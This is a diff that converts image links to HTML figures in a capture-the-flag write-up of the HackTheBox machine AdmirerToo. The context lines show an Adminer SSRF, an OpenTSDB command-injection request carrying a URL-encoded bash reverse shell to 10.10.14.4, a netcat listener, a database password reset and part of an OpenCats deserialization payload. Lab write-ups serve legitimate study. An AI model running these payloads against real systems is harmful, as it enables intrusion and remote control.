@@ -18,21 +18,23 @@
     <meta property="og:url" content="https://caueb.github.io/writeups/htb/machines/admirertoo/">
     <meta property="og:title" content="AdmirerToo">
     <meta property="og:description" content="IP: 10.10.11.137">
+    <meta property="og:image" content="https://caueb.github.io/writeups/htb/machines/admirertoo/images/image1.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/machines/admirertoo/">
     <meta property="twitter:title" content="AdmirerToo">
     <meta property="twitter:description" content="IP: 10.10.11.137">
+    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/machines/admirertoo/images/image1.png">
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="/resources/css/retype.css?v=2.2.707105549999" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=2.2.707105878059" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=2.2.707105549999" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=2.2.707105878059" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=2.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.707105549999" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.2.707105549999" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=2.2.707105878059" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=2.2.707105878059" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -288,7 +290,10 @@ Found: db.admirer-gallery.htb (Status: 200) [Size: 2568]</code></pre>
     </h3>
 </doc-anchor-target>
 <p>Accessing <a href="http://db.admirer-gallery.htb">http://db.admirer-gallery.htb</a> we get the Adminer v4.7.8 portal:
-![[admirertoo/images/image1.png]]
+<figure class="content-center">
+    <img src="images/image1.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
 We have access to database via web. Let’s enter and look for any interesting tables. just hit enter, and we are in.
 There’s only one table and nothing really interesting in that. The reason why it didn’t ask for any credentials is that the credentials are hard-coded in the page and POST them once we click on &quot;enter&quot; button&quot;</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -357,7 +362,11 @@ auth%5Bdriver%5D=server&amp;auth%5Bserver%5D=localhost&amp;auth%5Busername%5D=ad
 <p>So, we need to edit <code v-pre>Auth Driver</code> value and <code v-pre>Auth Server</code> value. According to POC PDF, we need to modify auth drive value to <code v-pre>elasticsearch</code> and auth server value as our attacking machine’s IP address (Kali Linux).
 After changing the both values, I couldn’t get a hit on our python script. Then I looked into the source of <code v-pre>Adminer</code> at <a href="https://github.com/vrana/adminer/tree/master/adminer/drivers">https://github.com/vrana/adminer/tree/master/adminer/drivers</a>:</p>
 <p>As you can see the source code, the driver name is just <code v-pre>elastic</code> not <code v-pre>elasticsearch</code>. This is the reason it didn’t work. Let’s change both values one more time.
-![[admirertoo/images/image2.png]]</p>
+<figure class="content-center">
+    <img src="images/image2.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>We get a hit:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1'
@@ -365,14 +374,22 @@ After changing the both values, I couldn’t get a hit on our python script. The
 10.10.11.137 - - [24/Mar/2022 15:13:24] &quot;GET / HTTP/1.0&quot; 302 -</code></pre>
 </doc-codeblock></div>
 <p>We got the <code v-pre>index.html</code> source of target port 80. This simply means, we can access any locally running service.
-![[admirertoo/images/image3.png]]</p>
+<figure class="content-center">
+    <img src="images/image3.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>As we saw in our initial port scan that three ports are filtered. Let’s try to access them via SSRF. Setup redirector for any of the three filtered ports.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242'</code></pre>
 </doc-codeblock></div>
 <p>Intercept the login request once again and check the webpage.
 We got the response and the title of the page is &quot;OpenTSDB&quot;.
-![[admirertoo/images/image4.png]]</p>
+<figure class="content-center">
+    <img src="images/image4.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>According to <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-18666/product_id-47794/Opentsdb-Opentsdb.html">CVE Details</a> there are 4 vulnerabilities for &quot;OpenTSDB&quot;. Two of them are Code Execution. But we need to find the right version information of running application. To get version information, we can use the below endpoint.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/api/version'</code></pre>
@@ -405,7 +422,11 @@ No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetI
 <pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27ping+-c+4+10.10.14.4%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
 </doc-codeblock></div>
 <p>Success! We get RCE!
-![[admirertoo/images/image5.png]]</p>
+<figure class="content-center">
+    <img src="images/image5.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <doc-anchor-target id="rce">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#rce">#</doc-anchor-trigger>
@@ -425,7 +446,7 @@ No such name for 'metrics': 'sys.cpu.nice'\n\tat net.opentsdb.uid.UniqueId$1GetI
 <pre class="language-bash"><code v-pre class="language-bash">$ python3 redirector.py 80 'http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%27%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%34%2f%39%30%30%31%20%30%3e%26%31%22%27)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json'</code></pre>
 </doc-codeblock></div>
 <p>Start a netcat listener on port 9001, intercept the database login and modify the parameters to trigger the SSRF -&gt; RCE and we are in:
-![[admirertoo/images/image6.png]]</p>
+<img src="images/image6.png" alt="" /></p>
 <doc-anchor-target id="shell-as-opentsdb">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#shell-as-opentsdb">#</doc-anchor-trigger>
@@ -557,7 +578,11 @@ Fail2Ban v0.10.2</code></pre>
 <pre class="language-bash"><code v-pre class="language-bash">$ ssh -L 9000:127.0.0.1:8080 jennifer@10.10.11.137</code></pre>
 </doc-codeblock></div>
 <p>Browsing to http://localhost:9000/ we see OpenCats website and version 0.9.5.2:
-![[admirertoo/images/image7.png]]</p>
+<figure class="content-center">
+    <img src="images/image7.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>This version has a deserialization vulnerability, <a href="https://www.cvedetails.com/cve/CVE-2021-25294/">CVE2021-25-294</a>, that can lead to remote command execution. But we need to authenticate in the web application first.</p>
 <doc-anchor-target id="opencats-database">
     <h3>
@@ -614,7 +639,11 @@ Query OK, 1 row affected (0.002 sec)
 Rows matched: 1  Changed: 1  Warnings: 0</code></pre>
 </doc-codeblock></div>
 <p>Great, now we can login as <code v-pre>admin:password123</code> in the website portal:
-![[admirertoo/images/image8.png]]</p>
+<figure class="content-center">
+    <img src="images/image8.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>There is a <a href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">blog by Snoopy Security</a> that explains how to exploit that CVE, we can read and follow along.</p>
 <doc-anchor-target id="exploiting-opencats">
     <h3>
@@ -713,7 +742,11 @@ a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs
 ---
 $ nc -lnvp 9001</code></pre>
 </doc-codeblock></div>
-<p>![[admirertoo/images/image9.png]]</p>
+<p><figure class="content-center">
+    <img src="images/image9.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
 <p>Step 5 - Now we go to the OpenCats website, click on the vulnerable &quot;Date&quot;, intercept the request and modify the parameter with our generated serialized object of step 2.</p>
 <p>Step 6 - Test -&gt; Run whois to our machine:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
